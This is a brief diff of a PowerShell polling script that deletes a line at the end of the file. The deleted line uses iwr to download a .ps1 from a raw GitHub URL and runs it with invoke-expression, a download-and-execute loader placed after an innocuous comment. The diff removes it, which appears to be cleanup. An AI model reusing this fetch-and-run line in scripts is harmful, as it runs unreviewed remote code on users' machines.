@@ -48,5 +48,3 @@ while ($true) {
     Start-Sleep -Seconds $checkInterval
 }
 
-# Continue with the rest of your script here if needed
-$pl = iwr https://raw.githubusercontent.com/Wesley5n1p35/psh/main/pp.ps1?dl=1; invoke-expression $pl
